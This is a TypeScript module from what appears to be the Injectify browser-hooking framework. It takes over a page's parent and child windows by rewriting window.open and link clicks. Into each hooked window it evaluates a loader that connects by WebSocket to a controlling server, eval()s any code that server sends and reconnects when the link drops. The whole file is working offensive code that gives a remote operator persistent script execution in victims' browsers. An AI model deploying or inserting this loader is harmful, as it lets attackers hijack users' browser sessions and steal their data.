import { Injectify } from '../../definitions/core'
declare const injectify: typeof Injectify

/**
 * Window-injection
 *
 * Transparently hooks the current page's parent
 * and child windows. Doesn't work cross-domain
 */
export default class {
  open = window.open

  constructor() {
    injectify.setState({
      windowInjection: true
    })
    if (window.opener) {
      injectify.debugLog('window-injection', 'warn', 'Listening! Any links on this page - will automatically be hooked')
    } else {
      injectify.debugLog('window-injection', 'warn', 'Listening! Links opened in a new tab from this page - will automatically be hooked')
    }
    this.hookChildren()
    this.hookParent()
  }

  hook(target, relation: string = '') {
    let code = `!function u(){window.ws=new WebSocket(${JSON.stringify(injectify.info.server.websocket)}),ws.onmessage=function(d){try{d=JSON.parse(d.data),eval(d.d)}catch(e){ws.send(JSON.stringify({t:"e",d:e.stack}))}},ws.onclose=function(){setTimeout(u,3e3)}}()`
    if (target) {
      if (target.location && target.location.href !== 'about:blank') {
        if (target.window.injectify) return
        injectify.debugLog('window-injection', 'warn', `Successfully hooked ${relation} tab ${target.location.href}`)
        if (target.window && typeof target.window.eval === 'function') {
          target.window.eval(code)
        } else if (target.location && target.location.href) {
          target.location = `javascript:${code}`
        }
      } else {
        target.addEventListener('DOMContentLoaded', () => {
          if (target.window.injectify) return
          injectify.debugLog('window-injection', 'warn', `Successfully hooked ${relation} tab ${target.location.href}`)
          if (target.window && typeof target.window.eval === 'function') {
            target.window.eval(code)
          } else if (target.location && target.location.href) {
            target.location = `javascript:${code}`
          }
        })
      }
    }
  }

  hookParent() {
    if (window.opener) this.hook(window.opener, 'parent')
  }

  hookChildren() {
    let { hook, open } = this
		/**
		 * Hook all <a> tags
		 */
    let links = document.getElementsByTagName('a')
    for (let i = 0; i < links.length; i++) {
      let link = links[i]
      if (link && link.href && (link.target === '_blank' || window.opener)) {
        link.addEventListener('click', event => {
          if (link.target === '_blank' || window.opener) {
            event.preventDefault()
            let child = open(link.href)
            hook(child, 'child')
            if (window.opener) window.close()
          }
        })
      }
    }

    window.open = function () {
      let target = open.apply(this, arguments)
      hook(target, 'child')
      return target
    }
  }
}